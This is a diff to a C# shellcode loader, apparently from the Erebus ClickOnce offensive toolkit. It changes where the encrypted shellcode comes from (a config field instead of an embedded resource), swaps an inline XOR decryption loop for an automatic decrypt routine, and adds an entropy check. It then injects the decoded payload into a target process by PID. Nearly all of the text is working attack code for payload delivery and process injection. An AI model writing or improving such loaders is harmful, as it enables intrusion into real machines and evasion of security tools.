@@ -1,5 +1,4 @@
 ﻿using Erebus.ClickOnce;
-using System;
 using System.Runtime.Versioning;
 
 namespace ShellcodeLoader
@@ -14,13 +13,14 @@ namespace ShellcodeLoader
             string injectionMethod = InjectionConfig.InjectionMethod;
             int targetPid = InjectionConfig.TargetPID;
             byte[] key = InjectionConfig.EncryptionKey;
+            byte[] shellcode = InjectionConfig.Shellcode;
 
             DebugLogger.WriteLine($"[*] Injection Method: {injectionMethod}");
             if (targetPid > 0)
                 DebugLogger.WriteLine($"[*] Target PID: {targetPid}");
 
             // Get encrypted shellcode
-            byte[] shellcode = ErebusRsrc.erebus_bin;
+            // byte[] shellcode = ErebusRsrc.erebus_bin;
             DebugLogger.WriteLine($"[+] Initial shellcode size: {shellcode.Length} bytes");
 
             // ============================================================
@@ -32,24 +32,18 @@ namespace ShellcodeLoader
             // Note: If shellcode is stored as encoded string, decode it first
             // This would typically be handled if the shellcode is base64/ascii85/etc encoded
 
-            // STEP 2: DECRYPT (XOR or other decryption)
-            DebugLogger.WriteLine("[*] STEP 2: Decrypting shellcode...");
-            if (key.Length > 0)
-            {
-                DebugLogger.WriteLine("[+] Applying XOR decryption...");
-                for (int i = 0; i < shellcode.Length; i++)
-                    shellcode[i] = (byte)(shellcode[i] ^ key[i % key.Length]);
-                DebugLogger.WriteLine($"[+] Decrypted shellcode size: {shellcode.Length} bytes");
-            }
-            else
-            {
-                DebugLogger.WriteLine("[*] No decryption key provided, skipping decryption");
-            }
+            // STEP 2: DECRYPT (Automatic encryption detection and decryption)
+            DebugLogger.WriteLine("[*] STEP 2: Detecting and decrypting shellcode...");
+            shellcode = DecryptionUtils.AutoDetectAndDecrypt(shellcode, key);
 
             // STEP 3: DECOMPRESS (Binary compression detection and decompression)
             DebugLogger.WriteLine("[*] STEP 3: Analyzing compression format...");
             shellcode = CompressionDecodingUtils.AutoDetectAndDecode(shellcode);
             DebugLogger.WriteLine($"[+] Final shellcode size: {shellcode.Length} bytes");
+
+            // Final entropy check
+            int finalEntropy = DecryptionUtils.CalculateEntropyScore(shellcode);
+            DebugLogger.WriteLine($"[*] Final entropy score: {finalEntropy}/100");
 
             // Execute injection
             try
@@ -60,7 +54,7 @@ namespace ShellcodeLoader
                 DebugLogger.WriteLine("");
 
                 bool success = injector.Inject(shellcode, targetPid);
-                
+
                 if (success)
                 {
                     DebugLogger.WriteLine("\n[+] Injection completed successfully!");
